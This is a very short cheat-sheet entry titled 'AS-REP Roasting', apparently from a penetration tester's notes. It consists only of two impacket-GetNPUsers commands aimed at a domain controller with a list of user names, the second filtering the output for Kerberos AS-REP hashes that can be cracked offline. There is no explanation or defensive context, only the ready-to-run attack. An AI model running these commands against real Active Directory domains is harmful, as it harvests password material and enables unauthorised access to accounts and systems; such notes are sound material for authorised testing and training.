# AS-REP Roasting

```
impacket-GetNPUsers -no-pass -request -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst
impacket-GetNPUsers -no-pass -request -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst | grep krb5asrep
```
